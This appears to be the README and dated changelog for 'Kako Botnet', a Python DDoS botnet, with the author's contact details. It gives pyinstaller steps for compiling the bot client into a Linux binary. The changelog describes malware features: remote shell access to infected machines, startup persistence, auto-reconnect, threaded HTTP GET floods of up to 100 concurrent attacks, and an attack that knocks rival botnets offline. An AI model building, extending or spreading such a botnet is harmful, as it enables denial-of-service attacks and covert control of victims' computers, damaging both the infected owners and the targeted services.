# Kako Botnet
This is a Python DDoS botnet.<br>
This botnet may have a few bugs, but, for what I have seen it works so far<br>
If I have made fixes I will post them here and state what was fixed<br>
# Compiling
If you are using linux do these steps:<br>
sudo pip install pyinstaller<br>
pyinstaller client.py --onefile<br>
cd dist<br>
and there you have it the new linux binary file<br>
# Contact Information
Skype: live:zerefdragneelbro<br>
Discord: [SuperNova] Law#6800<br>
Email: gotenblack321@gmail.com<br>
# Known Issues
None<br>
# Current Updates
[FIX] Kako.py - Bots have been recently disconnecting for no reason. So I have fixed the issue<br>
[ADDED] Client.py - Added auto reconnect functionality<br>
# 25/02/2018
[ADDED] Client.py - Added Shell command to access bots terminal<br>
[ADDED] Client.py - Added multi threading<br>
[ADDED] Kako.py - Just added information on how to use shell comand in ">help"<br>
# 28/02/2018
[ADDED] Kako.py - New command ">password" changes the guest password temporarily for the session, (only admins can use it)<br>
[ADDED] Kako.py - ">help" command now shows how to use ">password" only admins can see the command<br>
# 01/03/2018
[ADDED] Client.py - New DDoS command ">http" there is no timer but the attack does stop once all the threads have been sent<br>
[ADDED] Kako.py - ">help" command has been updated to have the information on how to use ">http"<br>
# 03/03/2018
[FIX] Kako.py - Command ">password" has been fixed the issue was there was a indent not needing to be there<br>
[FIX] Kako.py - Guest account would not work because the var "pwordGuest" was not global, now it is<br>
# 04/03/2018
[ADDED] Client.py - Command ">http" now supports a time limit in the attack<br>
[ADDED] Kako.py - Updated info in ">help" on how to use ">http"<br>
# 05/03/2018
[ADDED] Client.py - Command ">http" now attacks with HTTP GET and has User-Agents<br>
# 19/03/2018
[ADDED] Client.py - New function makes the bot open the file on startup no matter what the file is called.
# 08/04/2018
Big update guys. Hope you like it!<br>
[FIX] Client.py - Command ">shell" could only use 1 part of the command. Now it uses it all.<br>
[ADDED] Client.py - New attack ">cnc" it rapidly connects to another specified botnet. While the attack is running, other users cannot connect to the targeted botnet.<br>
[ADDED] Client.py - Use to only be able to send only 1 attack at a time. Now you can send up to 100 attacks at the same time.<br>
[ADDED] Client.py - All DDoS attacks use threading now.<br>
[ADDED] Kako.py - Dont we all just hate duplicated bots. Well now kako.py detects dups, and removes them.<br>
[ADDED] Kako.py - Info on how to use the commands have been updated in ">help"<br>
# 10/04/2018
[ADDED] Client.py - New command ">killattk" Stops all on going DDoS Attacks.<br>
[ADDED] Kako.py - Information on how to use killattk has been added to ">help"<br>
# 15/04/2018
[FIXED] Client.py - Auto Reconnect should now be functioning perfectly fine<br>
[FIXED] Client.py - DUP Removal was bugging out because of auto reconnect. Now its fixed, by sending a msg to close the bot<br>
# 24/05/2018
[FIXED] Kako-Untested.py - Banned.txt wasn't being looked at properly; Fixed<br>
[FIXED] Kako-Untested.py - New login system. Make a txt file named login.txt and input your username and password. Format: Username:Password<br>
